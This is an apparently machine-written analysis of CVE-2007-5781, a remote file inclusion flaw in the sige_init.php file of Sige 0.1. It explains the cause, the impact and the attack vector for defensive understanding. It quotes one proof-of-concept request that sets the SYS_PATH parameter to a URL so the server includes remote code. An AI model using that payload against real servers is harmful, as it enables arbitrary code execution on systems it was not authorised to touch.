Based on the provided information, here's an analysis of CVE-2007-5781:

**Root cause of vulnerability:**
- The vulnerability is a Remote File Inclusion (RFI) issue in the `sige_init.php` file of Sige version 0.1.

**Weaknesses/vulnerabilities present:**
- The code in `sige_init.php` includes a file based on the `SYS_PATH` parameter without proper sanitization.

**Impact of exploitation:**
- An attacker can include a remote file containing malicious code by providing a URL to the `SYS_PATH` parameter.
- Successful exploitation can lead to arbitrary code execution on the server.

**Attack vectors:**
- The vulnerability is exploited via a web request targeting the `inc/sige_init.php` file.
- The `SYS_PATH` parameter in the URL is used to specify the location of the malicious file.

**Required attacker capabilities/position:**
- The attacker needs to be able to send HTTP requests to the vulnerable server.
- The attacker must have access to a server that hosts the malicious code to be included.

**Additional details from Exploit-DB:**
- The Exploit-DB entry provides a proof of concept (POC) URL, `inc/sige_init.php?SYS_PATH=http://localhost/scripts/020.txt?` which demonstrates how the vulnerability can be triggered.
- It mentions that the vulnerable app is Sige 0.1 which can be downloaded from the provided URL.

In summary, CVE-2007-5781 is a Remote File Inclusion vulnerability in Sige 0.1 that allows an attacker to execute arbitrary code by including a malicious file from a remote server via the `SYS_PATH` parameter.
